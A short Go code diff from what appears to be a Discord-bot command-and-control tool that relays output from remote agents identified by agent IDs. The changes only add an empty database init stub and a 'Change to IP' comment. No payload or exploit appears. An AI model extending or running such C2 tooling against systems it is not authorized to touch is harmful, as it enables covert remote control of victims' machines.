@@ -17,6 +17,12 @@ import (
 	"github.com/fatih/color"
 )
 
+
+func init(){
+	// Create Database 
+	// COnnect to db
+}
+
 func main(){
 	dg, err := discordgo.New("Bot " + constants.BotToken)
 	if err != nil {
@@ -64,7 +70,7 @@ func messageCreateor(s *discordgo.Session, m *discordgo.MessageCreate){
 		cli.MainCompleter()
 
 	} else if messageJSON.MessageType == message.MESSAGE_OUTPUT {
-		color.Blue("\n[!] Result from " + messageJSON.AgentID)
+		color.Blue("\n[!] Result from " + messageJSON.AgentID) // Change to IP
 		color.Blue(messageJSON.Message)
 
 		// fmt.Println("\nNumber of attachments")
